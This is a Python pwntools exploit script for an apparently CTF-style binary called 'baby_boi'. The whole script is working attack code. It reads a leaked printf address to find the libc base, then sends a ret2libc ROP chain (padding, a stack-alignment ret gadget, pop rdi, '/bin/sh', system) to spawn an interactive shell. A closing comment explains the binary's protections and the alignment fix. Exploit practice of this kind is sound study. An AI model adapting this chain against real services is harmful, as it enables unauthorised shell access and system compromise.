#!/usr/bin/env python3

from pwn import *

exe = './baby_boi'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

#host,port = '',

p = process(exe)
#p = remote(host,port)

padding = 40

p.recvuntil('Here I am: ')
LEAK = int(p.recv().strip(),16)

info("LEAK value: %x",LEAK)

system_offset = libc.symbols.system # system offset not system absolute address since we did not define base of libc yet and libc has PIE enabled so we only see the offset
info("System offset: %x",system_offset) # can confirm using $readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

info("Without setting libc.address: %x",libc.address)

libc.address = LEAK - libc.symbols.printf  # to set base address of libc, by default its set to 0

info("LibC Address: %x",libc.address)

bin_sh = next(libc.search('/bin/sh'))
pop_rdi = 0x0000000000400793

system = libc.symbols['system'] # absolute address of system not its offset since we have defined the base of libc with libc.address, if we did not define it, we only get the offset of system

info("System Absolute: %x",system)

ret = 0x000000000040054e

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    ret,# without this exploit not working
    pop_rdi,
    bin_sh,
    system,
)

p.sendline(payload)
p.interactive()

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

    x/gx LEAK = 0x7ffff7e1cb30 <__printf>: so leaked value is of printf

For libc we got
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

PIE is enabled so when we do LEAK - libc.symbols.printf, we are subtracting the offset of printf so we get the base of libc

A small issue you may get when pwning on 64-bit systems is that your exploit works perfectly locally but fails remotely - or even fails when you try to use the provided LIBC version rather than your local one. This arises due to something called stack alignment

if the stack is not 16-byte aligned - that is, RSP is not a multiple of 16 - the ROP chain will fail on systems
The fix is simple - in your ROP chain, before the call to system, place a singular ret gadget

'''
